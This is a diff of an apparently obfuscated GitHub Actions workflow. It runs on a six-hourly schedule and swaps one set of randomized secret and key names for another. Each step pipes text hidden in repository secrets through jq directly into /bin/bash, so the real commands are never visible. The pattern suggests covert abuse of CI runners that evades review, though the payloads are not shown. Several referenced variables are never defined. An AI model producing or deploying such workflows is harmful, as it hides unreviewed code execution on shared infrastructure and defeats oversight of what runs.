@@ -1,25 +1,24 @@
 name: whoppingsweatsuit
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 4/6 * * *'
+    - cron: '46 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: whoppingsweatsuit
         env:
-          poox4964: ${{ secrets.poox4964 }}
+          l38293: ${{ secrets.l38293 }}
         run: |
-          echo $poox4964 | jq -r .lxehd537 | /bin/bash
-          echo $osie2951 | jq -r .odsz3240 | /bin/bash
-          echo $id4 | jq -r .wemae4 | /bin/bash
-          echo $il89 | jq -r .hfo65345 | /bin/bash
-          echo $kv3834 | jq -r .co2 | /bin/bash
-          echo $na3 | jq -r .mzfyh4 | /bin/bash
-          echo $d9307 | jq -r .bbqff72269 | /bin/bash
-          echo $cucs1 | jq -r .o53484 | /bin/bash
+          echo $l38293 | jq -r .uzv9 | /bin/bash
+          echo $xu716 | jq -r .ptkbk19170 | /bin/bash
+          echo $jyxl8810 | jq -r .w5 | /bin/bash
+          echo $i27 | jq -r .h20 | /bin/bash
+          echo $bfx15 | jq -r .foopy0152 | /bin/bash
+          echo $izh3669 | jq -r .satk01 | /bin/bash
+          echo $b7506 | jq -r .y0 | /bin/bash
+          echo $iqcn248 | jq -r .pf842 | /bin/bash
 
